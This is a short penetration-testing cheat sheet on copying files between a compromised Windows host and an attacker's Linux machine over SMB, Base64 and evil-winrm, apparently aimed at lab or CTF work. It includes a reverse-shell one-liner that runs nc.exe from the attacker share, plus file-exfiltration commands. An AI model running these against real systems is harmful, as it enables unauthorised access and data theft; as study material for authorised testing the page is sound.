---
title: "File Transfer (Windows To Linux)"
date: 2024-6-26
tags: ["file transfer", "Windows", "smb", "evil-winrm"]
---

---
### SMB

#### Start a Local SMB Server

```bash
impacket-smbserver share . -smb2support
```

#### cmd

```cmd
# Connect to SMB server without creds
net use \\10.10.14.10\share

# Connect to SMB server with creds
net use \\10.10.14.10\share /u:user password

# From target Windows to local Linux
copy test.txt \\10.10.14.10\share

# From local Linux to target Windows
copy \\10.10.14.10\share\test.txt test.txt

# Delete file
del test.txt

# Remove SMB share
net use /d \\10.13.14.10\share

# Older Windows (e.g., xp), use directly
\\10.10.14.10\share\nc.exe -e cmd.exe 10.10.14.10 443
```


<br>

---

### Base64 Encoding (for small binary)

```powershell
# In target Windows
[System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\Tasks\test.exe' -Encoding Byte))

# Copy and paste the base64 encoded binary to local Linux
echo -n '<base64 encoded binary>' | base64 -d > test.exe
```

<small>*Note: For restricted environment*</small>

---

### Evil-winrm

```bash
# Evil-winrm built-in function
download "C:\Windows\Tasks\test.txt" "/tmp/test.txt"
```

<br>